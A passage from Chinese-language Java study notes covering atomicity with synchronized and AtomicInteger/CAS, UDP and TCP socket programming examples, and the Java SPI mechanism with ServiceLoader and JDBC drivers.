                // 线程休眠2秒,模拟每隔两秒采集一次数据
                TimeUnit.SECONDS.sleep(2);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            // 环境温度改变
            temperature += 2 ;

        }

    }

}
```

测试类

```java
public class TemperatureSensorDemo {

    public static void main(String[] args) {

        // 创建TemperatureSensor对象
        TemperatureSensor temperatureSensor = new TemperatureSensor();

        // 创建ReadTemperatureRunnable类对象
        ReadTemperatureRunnable readTemperatureRunnable = new ReadTemperatureRunnable(temperatureSensor) ;

        // 创建GatherTemperatureRunnable类对象
        GatherTemperatureRunnable gatherTemperatureRunnable = new GatherTemperatureRunnable(temperatureSensor) ;

        // 创建2个Thread对象，并启动; 这两个线程负责读取TemperatureSensor中的温度数据
        for(int x = 0 ; x < 2 ; x++) {
            new Thread(readTemperatureRunnable).start();
        }

        // 创建1个Thread对象，并启动，这个线程负责读取定时采集数据中的温度数据
        Thread gatherThread = new Thread(gatherTemperatureRunnable);
        gatherThread.setName("温度采集线程");
        gatherThread.start();

    }

}
```

控制台输出结果

```java
...
温度采集线程-----采集到的数据为----->>> 23
Thread-0---读取到的温度数据为------>>> 23
...
温度采集线程-----采集到的数据为----->>> 25
Thread-1---读取到的温度数据为------>>> 25
...
```

通过控制台的输出，我们可以看到当温度采集线程刚采集到环境温度以后，那么此时两个温度读取线程就可以立即感知到环境温度的变化。

##### 11.11.5 问题处理

接下来我们就来讲解一下我们上述案例(引入原子性问题的案例)的解决方案。

==**锁机制**==

我们可以给count++操作添加锁，那么count++操作就是临界区中的代码，临界区中的代码一次只能被一个线程去执行，所以count++就变成了原子操作。

线程任务类

```java
public class VolatileAtomicThread implements Runnable {

    // 定义一个int类型的变量,
    private int count = 0 ;

    // 定义一个Object类型的变量，该变量将作为同步代码块的锁
    private Object obj = new Object();

    @Override
    public void run() {
        
        // 对该变量进行++操作，100次
        for(int x = 0 ; x < 100 ; x++) {
            synchronized (obj){
                count++ ;
                System.out.println("count =========>>>> " + count);
            }

        }
        
    }

}
```

控制台输出结果

```java
count =========>>>> 9998
count =========>>>> 9999
count =========>>>> 10000
```

==**原子类**==

(1).AtomicInteger

概述：java从JDK1.5开始提供了java.util.concurrent.atomic包(简称Atomic包)，这个包中的原子操作类提供了一种用法简单，性能高效，线程安全地更新一个变量的方式。因为变量的类型有很多种，所以在Atomic包里一共提供了13个类，属于4种类型的原子更新方式，分别是原子更新基本类型、原子更新数组、原子更新引用和原子更新属性(字段)。本次我们只讲解使用原子的方式更新基本类型，使用原子的方式更新基本类型Atomic包提供了以下3个类：

AtomicBoolean： 原子更新布尔类型

AtomicInteger： 原子更新整型

AtomicLong：	原子更新长整型

以上3个类提供的方法几乎一模一样，所以本节仅以AtomicInteger为例进行讲解，AtomicInteger的常用方法如下：

```java
public AtomicInteger()：	   				初始化一个默认值为0的原子型Integer
public AtomicInteger(int initialValue)： 初始化一个指定值的原子型Integer

int get():   			 				 获取值
int getAndIncrement():      			 以原子方式将当前值加1，注意，这里返回的是自增前的值。
int incrementAndGet():     				 以原子方式将当前值加1，注意，这里返回的是自增后的值。
int addAndGet(int data):				 以原子方式将输入的数值与实例中的值（AtomicInteger里的value）相加，并返回结果。
int getAndSet(int value):   			 以原子方式设置为newValue的值，并返回旧值。
```

案例演示AtomicInteger的基本使用：

```java
public class AtomicIntegerDemo01 {

    // 原子型Integer
    public static void main(String[] args) {

        // 构造方法
        // public AtomicInteger()：初始化一个默认值为0的原子型Integer
        // AtomicInteger atomicInteger = new AtomicInteger() ;
        // System.out.println(atomicInteger);

        // public AtomicInteger(int initialValue)： 初始化一个指定值的原子型Integer
        AtomicInteger atomicInteger = new AtomicInteger(5) ;
        System.out.println(atomicInteger);

        // 获取值
        System.out.println(atomicInteger.get());

        // 以原子方式将当前值加1，这里返回的是自增前的值
        System.out.println(atomicInteger.getAndIncrement());
        System.out.println(atomicInteger.get());

        // 以原子方式将当前值加1，这里返回的是自增后的值
        System.out.println(atomicInteger.incrementAndGet());

        // 以原子方式将输入的数值与实例中的值（AtomicInteger里的value）相加，并返回结果
        System.out.println(atomicInteger.addAndGet(8));

        // 以原子方式设置为newValue的值，并返回旧值
        System.out.println(atomicInteger.getAndSet(20));
        System.out.println(atomicInteger.get());

    }

}
```

(2).案例改造

使用AtomicInteger对案例进行改造。

```java
public class VolatileAtomicThread implements Runnable {

    // 定义一个int类型的变量
    private AtomicInteger atomicInteger = new AtomicInteger() ;

    @Override
    public void run() {

        // 对该变量进行++操作，100次
        for(int x = 0 ; x < 100 ; x++) {
            int i = atomicInteger.incrementAndGet();
            System.out.println("count =========>>>> " + i);
        }

    }

}
```

控制台输出结果

````java
...
count =========>>>> 9998
count =========>>>> 9999
count =========>>>> 10000
````

通过控制台的执行结果，我们可以看到最终得到的结果就是10000，因此也就证明AtomicInteger所提供的方法是原子性操作方法。

##### 11.11.6 AtomicInteger原理

==**原理介绍**==

AtomicInteger的本质：自旋锁 + CAS算法

CAS的全成是： Compare And Swap(比较再交换); 是现代CPU广泛支持的一种对内存中的共享数据进行操作的一种特殊指令。CAS可以将read-modify-write转换为原子操作，这个原子操作

直接由处理器保证。CAS有3个操作数，内存值V，旧的预期值A，要修改的新值B。当且仅当旧预期值A和内存值V相同时，将内存值V修改为B并返回true，否则什么都不做，并返回false。

举例说明：

1. 在内存值V当中，存储着值为10的变量。

![1571817059527](./img/小米虫爬山路-img/1571817059527.png)  

2. 此时线程1想要把变量的值增加1。对线程1来说，旧的预期值 A = 10 ，要修改的新值 B = 11。

![1571817085047](./img/小米虫爬山路-img/1571817085047.png) 

3. 在线程1要提交更新之前，另一个线程2抢先一步，把内存值V中的变量值率先更新成了11。

![1571817628904](./img/小米虫爬山路-img/1571817628904.png) 

4. 线程1开始提交更新，首先进行A和内存值V的实际值比较（Compare），发现A不等于V的值，提交失败。

![1571818176635](./img/小米虫爬山路-img/1571818176635.png) 

5. 线程1重新获取内存值V作为当前A的值，并重新计算想要修改的新值。此时对线程1来说，A = 11，B = 12。这个重新尝试的过程被称为<font color="red" size="4">**自旋**</font>。

![1571818465276](./img/小米虫爬山路-img/1571818465276.png) 

6. 这一次比较幸运，没有其他线程改变V的值。线程1进行Compare，发现A和V的值是相等的。

![1571818597998](./img/小米虫爬山路-img/1571818597998.png) 

7. 线程1进行SWAP，把内存V的值替换为B，也就是12。

![1571818747880](./img/小米虫爬山路-img/1571818747880.png) 

举例说明：这好比春节的时候抢火车票，下手快的会抢先买到票，而下手慢的可以再次尝试，直到买到票。

==**源码分析**==

那么接下来我们就来查看一下AtomicInteger类中incrementAndGet方法的源码。

```java
public class AtomicInteger extends Number implements java.io.Serializable {
    
    // cas算法的实现类
    private static final jdk.internal.misc.Unsafe U = jdk.internal.misc.Unsafe.getUnsafe();
    
    // 表示变量值在内存中的偏移量地址，unsafe类就是根据内存偏移量地址获取数据值。
    private static final long VALUE = U.objectFieldOffset(AtomicInteger.class, "value");
    private volatile int value;
    
    // 以原子方式将当前值加1，这里返回的是自增后的值
    public final int incrementAndGet() {
        
        /* this表示当前AtomicInteger对象 ，1表示要增加的值 */
        return U.getAndAddInt(this, VALUE, 1) + 1;		// 调用Unsafe类中的getAndAddInt方法
        
    }
    
}
```

UnSafe类

```java
public final class Unsafe {
    
    // Unsafe类中的getAndAddInt方法
    public final int getAndAddInt(Object o, long offset, int delta) {
        
        int v;
        
        // do...while就是自旋操作,当CAS成功以后，循环结束
        do {
            // 获取AtomicInteger类中所封装的int类型的值，就相当于旧的预期值A
            v = getIntVolatile(o, offset); 
            
            // 调用本类的weakCompareAndSetInt方法实现比较在交换； o: AtomicInteger对象, v: 相当于旧的预期值A, v + delta：新值B
        } while (!weakCompareAndSetInt(o, offset, v, v + delta));
        
        return v;
    }
    
    // Unsafe类中的weakCompareAndSetInt方法
    public final boolean weakCompareAndSetInt(Object o, long offset, int expected, int x) {
        return compareAndSetInt(o, offset, expected, x);
    }

    // 本地方法，调用CPU指令实现CAS
    public final native boolean compareAndSetInt(Object o, long offset, int expected, int x);
    
}
```

##### 11.11.7 CAS与Synchronized

CAS和Synchronized都可以保证多线程环境下共享数据的安全性。那么他们两者有什么区别？



Synchronized是从悲观的角度出发：

总是假设最坏的情况，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会阻塞直到它拿到锁（**共享资源每次只给一个线程使用，其它线程阻塞，用完后再把资源转让给其它线程**）。因此Synchronized我们也将其称之为悲观锁。jdk中的ReentrantLock也是一种悲观锁。



CAS是从乐观的角度出发:

总是假设最好的情况，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据。CAS这种机制我们也可以将其称之为乐观锁。

### 12、网络编程

#### 12.1 网络编程入门

##### 12.1.1 网络编程概述

- 计算机网络

  是指将地理位置不同的具有独立功能的多台计算机及其外部设备，通过通信线路连接起来，在网络操作系统，网络管理软件及网络通信协议的管理和协调下，实现资源共享和信息传递的计算机系统

- 网络编程

  在网络通信协议下，不同计算机上运行的程序，可以进行数据传输

##### 12.1.2 网络编程三要素

- IP地址

  要想让网络中的计算机能够互相通信，必须为每台计算机指定一个标识号，通过这个标识号来指定要接收数据的计算机和识别发送的计算机，而IP地址就是这个标识号。也就是设备的标识

- 端口

  网络的通信，本质上是两个应用程序的通信。每台计算机都有很多的应用程序，那么在网络通信时，如何区分这些应用程序呢？如果说IP地址可以唯一标识网络中的设备，那么端口号就可以唯一标识设备中的应用程序了。也就是应用程序的标识

- 协议

  通过计算机网络可以使多台计算机实现连接，位于同一个网络中的计算机在进行连接和通信时需要遵守一定的规则，这就好比在道路中行驶的汽车一定要遵守交通规则一样。在计算机网络中，这些连接和通信的规则被称为网络通信协议，它对数据的传输格式、传输速率、传输步骤等做了统一规定，通信双方必须同时遵守才能完成数据交换。常见的协议有UDP协议和TCP协议

##### 12.1.3 IP地址

IP地址：是网络中设备的唯一标识

- IP地址分为两大类
  - IPv4：是给每个连接在网络上的主机分配一个32bit地址。按照TCP/IP规定，IP地址用二进制来表示，每个IP地址长32bit，也就是4个字节。例如一个采用二进制形式的IP地址是“11000000 10101000 00000001 01000010”，这么长的地址，处理起来也太费劲了。为了方便使用，IP地址经常被写成十进制的形式，中间使用符号“.”分隔不同的字节。于是，上面的IP地址可以表示为“192.168.1.66”。IP地址的这种表示法叫做“点分十进制表示法”，这显然比1和0容易记忆得多
  - IPv6：由于互联网的蓬勃发展，IP地址的需求量愈来愈大，但是网络地址资源有限，使得IP的分配越发紧张。为了扩大地址空间，通过IPv6重新定义地址空间，采用128位地址长度，每16个字节一组，分成8组十六进制数，这样就解决了网络地址资源数量不够的问题
- DOS常用命令：
  - ipconfig：查看本机IP地址
  - ping IP地址：检查网络是否连通
- 特殊IP地址：
  - 127.0.0.1：是回送地址，可以代表本机地址，一般用来测试使用

==**注意:现如今IPv4已经使用完了，但是IPv6并没有大面积普及，所以使用多台网络设备共同使用一个公网IP，再有之间网络传输设备给每一个共享的网络设备分配一个局域网IP**==

##### 12.1.4 InetAddress

InetAddress：此类表示Internet协议（IP）地址

- 相关方法

  | 方法名                                    | 说明                                                         |
  | ----------------------------------------- | ------------------------------------------------------------ |
  | static InetAddress getByName(String host) | 确定主机名称的IP地址。主机名称可以是机器名称，也可以是IP地址 |
  | String getHostName()                      | 获取此IP地址的主机名                                         |
  | String getHostAddress()                   | 返回文本显示中的IP地址字符串                                 |

- 代码演示

  ```java
  public class InetAddressDemo {
      public static void main(String[] args) throws UnknownHostException {
  		//InetAddress address = InetAddress.getByName("itheima");
          InetAddress address = InetAddress.getByName("192.168.1.66");
  
          //public String getHostName()：获取此IP地址的主机名
          String name = address.getHostName();
          //public String getHostAddress()：返回文本显示中的IP地址字符串
          String ip = address.getHostAddress();
  
          System.out.println("主机名：" + name);
          System.out.println("IP地址：" + ip);
      }
  }
  ```

  ==**注意:获取Ip对象就是获取网络中的设备**==

##### 12.1.5 端口和协议

- 端口

  - 设备上应用程序的唯一标识

- 端口号

  - 用两个字节表示的整数，它的取值范围是0~65535。其中，0~1023之间的端口号用于一些知名的网络服务和应用，普通的应用程序需要使用1024以上的端口号。如果端口号被另外一个服务或应用所占用，会导致当前程序启动失败

- 协议

  - 计算机网络中，连接和通信的规则被称为网络通信协议

- UDP协议

  - 用户数据报协议(User Datagram Protocol)
  - UDP是**无连接**通信协议，即在数据传输时，**数据的发送端和接收端不建立逻辑连接**。简单来说，当一台计算机向另外一台计算机发送数据时，发送端不会确认接收端是否存在，就会发出数据，同样接收端在收到数据时，也不会向发送端反馈是否收到数据。
  - 由于使用UDP协议消耗系统资源小，通信效率高，所以通常都会用于音频、视频和普通数据的传输
  - 例如视频会议通常采用UDP协议，因为这种情况即使偶尔丢失一两个数据包，也不会对接收结果产生太大影响。但是在使用UDP协议传送数据时，由于UDP的面向无连接性，不能保证数据的完整性，因此在传输重要数据时不建议使用UDP协议

- TCP协议

  - 传输控制协议 (Transmission Control Protocol)

  - TCP协议是面向连接的通信协议，即传输数据之前，在发送端和接收端建立逻辑连接，然后再传输数据，它提供了两台计算机之间可靠无差错的数据传输。在TCP连接中必须要明确客户端与服务器端，由客户端向服务端发出连接请求，每次连接的创建都需要经过“三次握手”

  - 三次握手：TCP协议中，在发送数据的准备阶段，客户端与服务器之间的三次交互，以保证连接的可靠

    第一次握手，客户端向服务器端发出连接请求，等待服务器确认

    第二次握手，服务器端向客户端回送一个响应，通知客户端收到了连接请求

    第三次握手，客户端再次向服务器端发送确认信息，确认连接

  - 完成三次握手，连接建立后，客户端和服务器就可以开始进行数据传输了。由于这种面向连接的特性，TCP协议可以保证传输数据的安全，所以应用十分广泛。例如上传文件、下载文件、浏览网页等

#### 12.2 UDP通信程序

##### 12.2.1 UDP发送数据

- Java中的UDP通信

  - UDP协议是一种不可靠的网络协议，它在通信的两端各建立一个Socket对象，但是这两个Socket只是发送，接收数据的对象，因此对于基于UDP协议的通信双方而言，没有所谓的客户端和服务器的概念
  - Java提供了DatagramSocket类作为基于UDP协议的Socket

- 构造方法

  | 方法名                                                      | 说明                                                 |
  | ----------------------------------------------------------- | ---------------------------------------------------- |
  | DatagramSocket()                                            | 创建数据报套接字并将其绑定到本机地址上的任何可用端口 |
  | DatagramPacket(byte[] buf,int len,InetAddress add,int port) | 创建数据包,发送长度为len的数据包到指定主机的指定端口 |

- 相关方法

  | 方法名                         | 说明                   |
  | ------------------------------ | ---------------------- |
  | void send(DatagramPacket p)    | 发送数据报包           |
  | void close()                   | 关闭数据报套接字       |
  | void receive(DatagramPacket p) | 从此套接字接受数据报包 |

- 发送数据的步骤

  - 创建发送端的Socket对象(DatagramSocket)
  - 创建数据，并把数据打包
  - 调用DatagramSocket对象的方法发送数据
  - 关闭发送端

- 代码演示

```java
public class SendDemo {
    public static void main(String[] args) throws IOException {
        //创建发送端的Socket对象(DatagramSocket)
        // DatagramSocket() 构造数据报套接字并将其绑定到本地主机上的任何可用端口
        DatagramSocket ds = new DatagramSocket();

        //创建数据，并把数据打包
        //DatagramPacket(byte[] buf, int length, InetAddress address, int port)
        //构造一个数据包，发送长度为 length的数据包到指定主机上的指定端口号。
        byte[] bys = "hello,udp,我来了".getBytes();

        DatagramPacket dp = new DatagramPacket(bys,bys.length,InetAddress.getByName("127.0.0.1"),10086);

        //调用DatagramSocket对象的方法发送数据
        //void send(DatagramPacket p) 从此套接字发送数据报包
        ds.send(dp);

        //关闭发送端
        //void close() 关闭此数据报套接字
        ds.close();
    }
}
```

##### 12.2.2 UDP接收数据

- 接收数据的步骤

  - 创建接收端的Socket对象(DatagramSocket)
  - 创建一个数据包，用于接收数据
  - 调用DatagramSocket对象的方法接收数据
  - 解析数据包，并把数据在控制台显示
  - 关闭接收端

- 构造方法

  | 方法名                              | 说明                                            |
  | ----------------------------------- | ----------------------------------------------- |
  | DatagramPacket(byte[] buf, int len) | 创建一个DatagramPacket用于接收长度为len的数据包 |

- 相关方法

  | 方法名            | 说明                                     |
  | ----------------- | ---------------------------------------- |
  | byte[]  getData() | 返回数据缓冲区                           |
  | int  getLength()  | 返回要发送的数据的长度或接收的数据的长度 |

- 示例代码

```java
public class ReceiveDemo {
    public static void main(String[] args) throws IOException {
      	//创建接收端的Socket对象(DatagramSocket)
      	DatagramSocket ds = new DatagramSocket(12345);

      	//创建一个数据包，用于接收数据
      	byte[] bys = new byte[1024];
      	DatagramPacket dp = new DatagramPacket(bys, bys.length);

      	//调用DatagramSocket对象的方法接收数据
      	ds.receive(dp);

      	//解析数据包，并把数据在控制台显示
      	System.out.println("数据是：" + new String(dp.getData(), 0, dp.getLength()));
        }
    }
}
```

==**注意:要先运行接收端再运行发送端**==

##### 12.2.3 UDP通信程序练习

- 案例需求

  UDP发送数据：数据来自于键盘录入，直到输入的数据是886，发送数据结束

  UDP接收数据：因为接收端不知道发送端什么时候停止发送，故采用死循环接收

- 代码实现

  ```java
  /*
      UDP发送数据：
          数据来自于键盘录入，直到输入的数据是886，发送数据结束
   */
  public class SendDemo {
      public static void main(String[] args) throws IOException {
          //创建发送端的Socket对象(DatagramSocket)
          DatagramSocket ds = new DatagramSocket();
          //键盘录入数据
          Scanner sc = new Scanner(System.in);
          while (true) {
            	String s = sc.nextLine();
              //输入的数据是886，发送数据结束
              if ("886".equals(s)) {
                  break;
              }
              //创建数据，并把数据打包
              byte[] bys = s.getBytes();
              DatagramPacket dp = new DatagramPacket(bys, bys.length, InetAddress.getByName("192.168.1.66"), 12345);
  
              //调用DatagramSocket对象的方法发送数据
              ds.send(dp);
          }
          //关闭发送端
          ds.close();
      }
  }
  
  /*
      UDP接收数据：
          因为接收端不知道发送端什么时候停止发送，故采用死循环接收
   */
  public class ReceiveDemo {
      public static void main(String[] args) throws IOException {
          //创建接收端的Socket对象(DatagramSocket)
          DatagramSocket ds = new DatagramSocket(12345);
          while (true) {
              //创建一个数据包，用于接收数据
              byte[] bys = new byte[1024];
              DatagramPacket dp = new DatagramPacket(bys, bys.length);
              //调用DatagramSocket对象的方法接收数据
              ds.receive(dp);
              //解析数据包，并把数据在控制台显示
              System.out.println("数据是：" + new String(dp.getData(), 0, dp.getLength()));
          }
          //关闭接收端
  //        ds.close();
      }
  }
  ```

##### 12.2.4 UDP三种通讯方式

- 单播

  单播用于两个主机之间的端对端通信

- 组播

  组播用于对一组特定的主机进行通信

- 广播

  广播用于一个主机对整个局域网上所有主机上的数据通信

##### 12.2.5 UDP组播实现

- 实现步骤

  - 发送端
    1. 创建发送端的Socket对象(DatagramSocket)
    2. 创建数据，并把数据打包(DatagramPacket)
    3. 调用DatagramSocket对象的方法发送数据(在单播中,这里是发给指定IP的电脑但是在组播当中,这里是发给组播地址)
    4. 释放资源
  - 接收端
    1. 创建接收端Socket对象(MulticastSocket)
    2. 创建一个箱子,用于接收数据
    3. 把当前计算机绑定一个组播地址
    4. 将数据接收到箱子中
    5. 解析数据包,并打印数据
    6. 释放资源

- 代码实现

  ```java
  // 发送端
  public class ClinetDemo {
      public static void main(String[] args) throws IOException {
          // 1. 创建发送端的Socket对象(DatagramSocket)
          DatagramSocket ds = new DatagramSocket();
          String s = "hello 组播";
          byte[] bytes = s.getBytes();
          InetAddress address = InetAddress.getByName("224.0.1.0");
          int port = 10000;
          // 2. 创建数据，并把数据打包(DatagramPacket)
          DatagramPacket dp = new DatagramPacket(bytes,bytes.length,address,port);
          // 3. 调用DatagramSocket对象的方法发送数据(在单播中,这里是发给指定IP的电脑但是在组播当中,这里是发给组播地址)
          ds.send(dp);
          // 4. 释放资源
          ds.close();
      }
  }
  // 接收端
  public class ServerDemo {
      public static void main(String[] args) throws IOException {
          // 1. 创建接收端Socket对象(MulticastSocket)
          MulticastSocket ms = new MulticastSocket(10000);
          // 2. 创建一个箱子,用于接收数据
          DatagramPacket dp = new DatagramPacket(new byte[1024],1024);
          // 3. 把当前计算机绑定一个组播地址,表示添加到这一组中.
          ms.joinGroup(InetAddress.getByName("224.0.1.0"));
          // 4. 将数据接收到箱子中
          ms.receive(dp);
          // 5. 解析数据包,并打印数据
          byte[] data = dp.getData();
          int length = dp.getLength();
          System.out.println(new String(data,0,length));
          // 6. 释放资源
          ms.close();
      }
  }
  ```

##### 12.2.6 UDP广播实现

- 实现步骤

  - 发送端
    1. 创建发送端Socket对象(DatagramSocket)
    2. 创建存储数据的箱子,将广播地址封装进去
    3. 发送数据
    4. 释放资源
  - 接收端
    1. 创建接收端的Socket对象(DatagramSocket)
    2. 创建一个数据包，用于接收数据
    3. 调用DatagramSocket对象的方法接收数据
    4. 解析数据包，并把数据在控制台显示
    5. 关闭接收端

- 代码实现

  ```java
  // 发送端
  public class ClientDemo {
      public static void main(String[] args) throws IOException {
        	// 1. 创建发送端Socket对象(DatagramSocket)
          DatagramSocket ds = new DatagramSocket();
  		// 2. 创建存储数据的箱子,将广播地址封装进去
          String s = "广播 hello";
          byte[] bytes = s.getBytes();
          InetAddress address = InetAddress.getByName("255.255.255.255");
          int port = 10000;
          DatagramPacket dp = new DatagramPacket(bytes,bytes.length,address,port);
  		// 3. 发送数据
          ds.send(dp);
  		// 4. 释放资源
          ds.close();
      }
  }
  
  // 接收端
  public class ServerDemo {
      public static void main(String[] args) throws IOException {
          // 1. 创建接收端的Socket对象(DatagramSocket)
          DatagramSocket ds = new DatagramSocket(10000);
          // 2. 创建一个数据包，用于接收数据
          DatagramPacket dp = new DatagramPacket(new byte[1024],1024);
          // 3. 调用DatagramSocket对象的方法接收数据
          ds.receive(dp);
          // 4. 解析数据包，并把数据在控制台显示
          byte[] data = dp.getData();
          int length = dp.getLength();
          System.out.println(new String(data,0,length));
          // 5. 关闭接收端
          ds.close();
      }
  }
  ```

#### 12.3 TCP通信程序

##### 12.3.1 TCP发送数据

- Java中的TCP通信

  - Java对基于TCP协议的的网络提供了良好的封装，使用Socket对象来代表两端的通信端口，并通过Socket产生IO流来进行网络通信。
  - Java为客户端提供了Socket类，为服务器端提供了ServerSocket类

- 构造方法

  | 方法名                               | 说明                                           |
  | ------------------------------------ | ---------------------------------------------- |
  | Socket(InetAddress address,int port) | 创建流套接字并将其连接到指定IP指定端口号       |
  | Socket(String host, int port)        | 创建流套接字并将其连接到指定主机上的指定端口号 |

- 相关方法

  | 方法名                         | 说明                 |
  | ------------------------------ | -------------------- |
  | InputStream  getInputStream()  | 返回此套接字的输入流 |
  | OutputStream getOutputStream() | 返回此套接字的输出流 |

- 示例代码

  ```java
  public class Client {
      public static void main(String[] args) throws IOException {
          //TCP协议，发送数据
  
          //1.创建Socket对象
          //细节：在创建对象的同时会连接服务端
          //      如果连接不上，代码会报错
          Socket socket = new Socket("127.0.0.1",10000);
  
          //2.可以从连接通道中获取输出流
          OutputStream os = socket.getOutputStream();
          //写出数据
          os.write("aaa".getBytes());
  
          //3.释放资源
          os.close();
          socket.close();
      }
  }
  ```

##### 12.3.2 TCP接收数据

- 构造方法

  | 方法名                 | 说明                             |
  | ---------------------- | -------------------------------- |
  | ServerSocket(int port) | 创建绑定到指定端口的服务器套接字 |

- 相关方法

  | 方法名          | 说明                           |
  | --------------- | ------------------------------ |
  | Socket accept() | 监听要连接到此的套接字并接受它 |

- 注意事项

  1. accept方法是阻塞的,作用就是等待客户端连接
  2. 客户端创建对象并连接服务器,此时是通过三次握手协议,保证跟服务器之间的连接
  3. 针对客户端来讲,是往外写的,所以是输出流
     针对服务器来讲,是往里读的,所以是输入流
  4. read方法也是阻塞的
  5. 客户端在关流的时候,还多了一个往服务器写结束标记的动作
  6. 最后一步断开连接,通过四次挥手协议保证连接终止

- 三次握手和四次挥手

  - 三次握手

  ![image-20240215135445111](./img/小米虫爬山路-img/image-20240215135445111.png)

  - 四次挥手

  ![image-20240215135453370](./img/小米虫爬山路-img/image-20240215135453370.png)

  - 示例代码

    ```java
    public class Server {
        public static void main(String[] args) throws IOException {
            //TCP协议，接收数据
    
            //1.创建对象ServerSocker
            ServerSocket ss = new ServerSocket(10000);
    
            //2.监听客户端的链接
            Socket socket = ss.accept();
    
            //3.从连接通道中获取输入流读取数据
            InputStream is = socket.getInputStream();
            int b;
            while ((b = is.read()) != -1){
                System.out.println((char) b);
            }
    
            //4.释放资源
            socket.close();
            ss.close();
        }
    }
    ```


##### 12.3.3 TCP程序练习（传输中文）

发送端：

```java
public class Client {
    public static void main(String[] args) throws IOException {
        //TCP协议，发送数据

        //1.创建Socket对象
        //细节：在创建对象的同时会连接服务端
        //      如果连接不上，代码会报错
        Socket socket = new Socket("127.0.0.1",10000);


        //2.可以从连接通道中获取输出流
        OutputStream os = socket.getOutputStream();
        //写出数据
        os.write("你好你好".getBytes());//12字节

        //3.释放资源
        os.close();
        socket.close();

    }
}

```

接收端：

```java
public class Server {
    public static void main(String[] args) throws IOException {
        //TCP协议，接收数据

        //1.创建对象ServerSocker
        ServerSocket ss = new ServerSocket(10000);

        //2.监听客户端的链接
        Socket socket = ss.accept();

        //3.从连接通道中获取输入流读取数据
        InputStream is = socket.getInputStream();
        InputStreamReader isr = new InputStreamReader(is);
        BufferedReader br = new BufferedReader(isr);

        // BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));

        int b;
        while ((b = br.read()) != -1){
            System.out.print((char) b);
        }

        //4.释放资源
        socket.close();
        ss.close();

    }
}
```

### 13、SPI

#### 13.1 SPI概念

SPI（Service Provider Interface），是JDK内置的一种 服务提供发现机制，可以用来启用框架扩展和替换组件，主要是被框架的开发人员使用，比如java.sql.Driver接口，其他不同厂商可以针对同一接口做出不同的实现，MySQL和PostgreSQL都有不同的实现提供给用户，而Java的SPI机制可以为某个接口寻找服务实现。Java中SPI机制主要思想是将装配的控制权移到程序之外，在模块化设计中这个机制尤其重要，其核心思想就是 **解耦**。

SPI整体机制图如下：

![img](./img/小米虫爬山路-img/java-advanced-spi-8-1736510294370-5.jpg)

当服务的提供者提供了一种接口的实现之后，需要在classpath下的`META-INF/services/`目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的实现类。当其他的程序需要这个服务的时候，就可以通过查找这个jar包（一般都是以jar包做依赖）的`META-INF/services/`中的配置文件，配置文件中有接口的具体实现类名，可以根据这个类名进行加载实例化，就可以使用该服务了。JDK中查找服务的实现的工具类是`java.util.ServiceLoader`。

#### 13.2 SPI机制的简单示例

我们现在需要使用一个内容搜索接口，搜索的实现可能是基于文件系统的搜索，也可能是基于数据库的搜索。

- 先定义好接口

```java
public interface Search {
    public List<String> searchDoc(String keyword);   
}
```

- 文件搜索实现

```java
public class FileSearch implements Search{
    @Override
    public List<String> searchDoc(String keyword) {
        System.out.println("文件搜索 "+keyword);
        return null;
    }
}
```

- 数据库搜索实现

```java
public class DatabaseSearch implements Search{
    @Override
    public List<String> searchDoc(String keyword) {
        System.out.println("数据搜索 "+keyword);
        return null;
    }
}
```

- resources 接下来可以在resources下新建META-INF/services/目录，然后新建接口全限定名的文件：`com.cainiao.ys.spi.learn.Search`，里面加上我们需要用到的实现类

```xml
com.cainiao.ys.spi.learn.FileSearch
```

- 测试方法

```java
public class TestCase {
    public static void main(String[] args) {
        ServiceLoader<Search> s = ServiceLoader.load(Search.class);
        Iterator<Search> iterator = s.iterator();
        while (iterator.hasNext()) {
           Search search =  iterator.next();
           search.searchDoc("hello world");
        }
    }
}
```

可以看到输出结果：文件搜索 hello world

如果在`com.cainiao.ys.spi.learn.Search`文件里写上两个实现类，那最后的输出结果就是两行了。

这就是因为`ServiceLoader.load(Search.class)`在加载某接口时，会去`META-INF/services`下找接口的全限定名文件，再根据里面的内容加载相应的实现类。

这就是spi的思想，接口的实现由provider实现，provider只用在提交的jar包里的`META-INF/services`下根据平台定义的接口新建文件，并添加进相应的实现类内容就好。

#### 13.3 SPI机制的广泛应用

##### 13.3.1 SPI机制 - JDBC DriverManager

> 在JDBC4.0之前，我们开发有连接数据库的时候，通常会用Class.forName("com.mysql.jdbc.Driver")这句先加载数据库相关的驱动，然后再进行获取连接等的操作。**而JDBC4.0之后不需要用Class.forName("com.mysql.jdbc.Driver")来加载驱动，直接获取连接就可以了，现在这种方式就是使用了Java的SPI扩展机制来实现**。

1. **JDBC接口定义**

首先在java中定义了接口`java.sql.Driver`，并没有具体的实现，具体的实现都是由不同厂商来提供的。

2. **mysql实现**

在mysql的jar包`mysql-connector-java-6.0.6.jar`中，可以找到`META-INF/services`目录，该目录下会有一个名字为`java.sql.Driver`的文件，文件内容是`com.mysql.cj.jdbc.Driver`，这里面的内容就是针对Java中定义的接口的实现。

3. **postgresql实现**

同样在postgresql的jar包`postgresql-42.0.0.jar`中，也可以找到同样的配置文件，文件内容是`org.postgresql.Driver`，这是postgresql对Java的`java.sql.Driver`的实现。

4. **使用方法**

上面说了，现在使用SPI扩展来加载具体的驱动，我们在Java中写连接数据库的代码的时候，不需要再使用`Class.forName("com.mysql.jdbc.Driver")`来加载驱动了，而是直接使用如下代码：

```java
String url = "jdbc:xxxx://xxxx:xxxx/xxxx";
Connection conn = DriverManager.getConnection(url,username,password);
```

这里并没有涉及到spi的使用，接着看下面的解析。

5. **源码实现**

上面的使用方法，就是我们普通的连接数据库的代码，并没有涉及到SPI的东西，但是有一点我们可以确定的是，我们没有写有关具体驱动的硬编码`Class.forName("com.mysql.jdbc.Driver")`！

上面的代码可以直接获取数据库连接进行操作，但是跟SPI有啥关系呢？上面代码没有了加载驱动的代码，我们怎么去确定使用哪个数据库连接的驱动呢？这里就涉及到使用Java的SPI扩展机制来查找相关驱动的东西了，关于驱动的查找其实都在`DriverManager`中，`DriverManager`是Java中的实现，用来获取数据库连接，在`DriverManager`中有一个静态代码块如下：

```java
static {
    loadInitialDrivers();
    println("JDBC DriverManager initialized");
}
```

可以看到是加载实例化驱动的，接着看loadInitialDrivers方法：

```java
private static void loadInitialDrivers() {
    String drivers;
    try {
